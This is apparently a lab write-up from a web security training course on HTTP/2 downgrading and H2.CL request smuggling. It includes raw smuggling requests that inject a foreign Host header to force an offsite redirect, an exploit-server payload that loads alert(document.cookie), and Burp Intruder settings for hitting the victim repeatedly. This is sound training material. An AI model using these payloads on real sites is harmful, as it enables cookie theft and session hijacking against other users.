# HTTP/2 message length

HTTP/2 messages are sent over the wire as a series of separate "frames". 

Each frame is preceded by an explicit length field, that tells the server how many bytes to read in. So, the length of the request is the sum of its frame lengths.

In theory this means that there is no opportunity for an attacker to do the request smuggling, as long as the website uses HTTP/2 end to end. However, there is another way around - HTTP/2 downgrading

# HTTP/2 downgrading

This is a process of rewriting HTTP/2 requests using the HTTP/1 syntax and generate an equivalent request. Web servers and reverse proxies often do this to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1.

So, basically this can be exploited because sometimes the front-end doesn't really check if the added `Content-Length` matches the HTTP/2 mechanism for the content length, and this allows the attacker to smuggle requests.

## H2.CL exploiting

The lab is vulnerable because the front-end downgrades requests even if they have different length.

The challenge is to perform a request smuggling attack which will cause the victim's browser to load and execute a JavaScript file from the exploit server, and call `alert(document.cookie)`. The victim accesses the home page every 10 seconds.

First let's send the request of the root to the repeater, and change the method from `GET` to `POST`, and delete the unnecessary stuff, to get a clean request like the one below.

Also add the `Content-Length` header.

```http
POST / HTTP/2
Host: 0a90001903c660e2815b61350085001e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

Turn off the automatic updating of the length, as we want to control it.

Now, find an onsite redirect. For this, pick a request to a javascript file, and omit the name of the file, and see the response.

From this request `GET /resources/labheader/js/labHeader.js`, when I removed the name of the file `GET /resources/labheader/js/` I got a `404`, but when I omit the terminating slash `GET /resources/labheader/js` then I got a `302 Found` and the location header was with the terminating slash. This means we got an onsite redirect.

Now let's turn this to an offsite redirect.

Modify the attack request in a way that it will inject also a `Host`:

```http
POST / HTTP/2
Host: 0a90001903c660e2815b61350085001e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/labheader/js HTTP/1.1
Host: halilWasHere.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

As the frontend will not consider the `Content-Length` we put it to 5 because we want to end in the backend exactly after `x=1`, and we put it to three, because we want at least one byte from the normal request to be appended to it.

If we send this and immediately a normal request we got a:

```http
HTTP/2 302 Found
Location: https://halilWasHere.com/resources/labheader/js/
...
```

This means the offsite redirect has worked.

Now in our exploit server, put that path to `/resources/labheader/js/`, head to:

```http
HTTP/1.1 200 OK
Content-Type: text/javascript: charset=utf-8
```

and body to: `alert(document.cookie);`

Don't forget to add the attack request the Host of the exploit server.

Now automate the attack with the intruder, by sending our attack request and use the `Sniper` attack type, a `Null payload` payload type, and untick the `Update Content-Length header`.

Generate around 100 payloads, with a maximum concurrent request to 1 and with some delay like a 300ms between request.

Start the attack and look out for responses. When you see two `200` status codes in a row, that means one of the requests got intercepted by the lab victim, and when that happens, the lab is solved.

## H2.TL exploiting

By default chunked encoding is incompatible with the HTTP/2 and that any `transfer-encoding: chunked` header will be stripped or the request blocked entirely.

If this is not done in the frontend, and the request downgrades for a HTTP/1 that supports chunked encoding, then this can enable request smuggling attacks.

